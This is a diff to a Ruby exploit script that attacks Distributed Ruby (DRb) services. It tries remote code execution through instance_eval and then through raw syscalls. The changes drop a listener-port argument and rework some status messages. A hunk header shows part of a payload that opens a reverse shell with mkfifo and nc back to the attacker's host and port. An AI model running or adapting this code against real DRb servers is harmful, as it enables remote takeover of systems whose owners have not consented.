@@ -2,9 +2,8 @@ require 'drb/drb'
 require 'ostruct'
 
 class DRbExploit
-  def initialize(host, port, lport)
+  def initialize(host, port)
     @uri = "druby://#{host}:#{port}"
-    @lport = lport
   end
 
   def exploit(payload)
@@ -15,11 +14,11 @@ class DRbExploit
       class << p
         undef :send
       end
-      
+
       puts 'Trying to exploit instance_eval'
       p.send(:instance_eval, "Kernel.fork { `#{payload.encoded}` }")
     rescue SecurityError => e
-      puts "Instance eval failed! Trying to exploit syscall.. Hope you are listening on port #{@lport}"
+      puts 'Instance eval failed! trying to exploit syscall'
       filename = "." + rand_text_alphanumeric(16)
       begin
         j = p.send(:syscall, 20)
@@ -40,8 +39,8 @@ class DRbExploit
     ensure
       DRb.stop_service
     end
-    puts "Payload executed from file #{filename}!" unless filename.nil?
-    #puts 'Make sure to remove that file' unless filename.nil?
+    puts "Payload executed from file #{filename}" unless filename.nil?
+    puts 'Make sure to remove that file' unless filename.nil?
   end
 
   private
@@ -73,5 +72,5 @@ payload = OpenStruct.new(encoded: "mkfifo /tmp/gythfa; nc #{lhost} #{lport} 0</t
 
 
 # Create exploit object with provided host and port
-exploit = DRbExploit.new(host, port, lport)
+exploit = DRbExploit.new(host, port)
 exploit.exploit(payload)
